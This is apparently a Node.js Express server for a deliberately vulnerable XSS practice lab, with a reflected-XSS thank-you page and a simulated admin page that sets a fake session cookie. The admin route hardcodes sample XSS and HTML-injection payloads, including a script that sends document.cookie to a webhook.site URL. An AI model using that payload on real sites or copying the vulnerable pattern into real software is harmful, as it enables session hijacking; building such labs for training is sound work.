const express = require('express')
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 8888;

app.set('view engine', 'ejs');
app.use(express.urlencoded({extended:true}));
const dataFilePath = path.join(__dirname, 'submissions.json');
app.set("views", path.join(__dirname, "views"));
app.use(express.static(path.join(__dirname, "public")));

// Middleware for logging requests
app.use((req, res, next) => {
    const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url}`;
    console.log(logEntry);
    next();
});


// endpoint for emulating a bot page with cookies
app.get('/xss-bot', (req, res) => {
    const { name, email } = req.query;
    res.cookie('session_id', 'super-secret-session-cookie-value-for-admin', { maxAge: 86400000 });

    res.redirect(`/thankyou?name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}`);
});

function record(name, email) {
    // Add new submission
    submissions = { name, email };
    fs.writeFileSync(dataFilePath, JSON.stringify(submissions, null, 2));
}

// Submit route with XSS vulnerability in the thank you page
app.post('/submit', (req, res) => {
    const { name, email } = req.body;
    record(name, email);

    res.redirect(`/thankyou?name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}`);
});

// Thank you page with reflected XSS vulnerability
app.get('/thankyou', (req, res) => {
    const { name, email } = req.query;
    res.render('thank-you', {name, email});
});

app.get('/', (req, res) => {
    res.render('main');
});

// endpoint for emulating a bot page with cookies
app.get('/admin', (req, res) => {
    const users = [
        { name: "John", email: "johndoe@example.com" },
        { name: "<script>alert('XSS from name')</script>", email: "johndoe@example.com" },
        { name: "<h1>HTML Injection Payload</h1>", email: "johndoe@example.com" },
        { name: "<script>document.location=\"https://webhook.site/784a92e9-a8b6-4e52-909e-39b089049ea2?cookies=\"+document.cookie;</script>", email: "johndoe@example.com" }
      ];

    res.cookie('session_id', 'super-secret-session-cookie-value-for-admin', { maxAge: 86400000 });
    res.render('admin', { users });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
})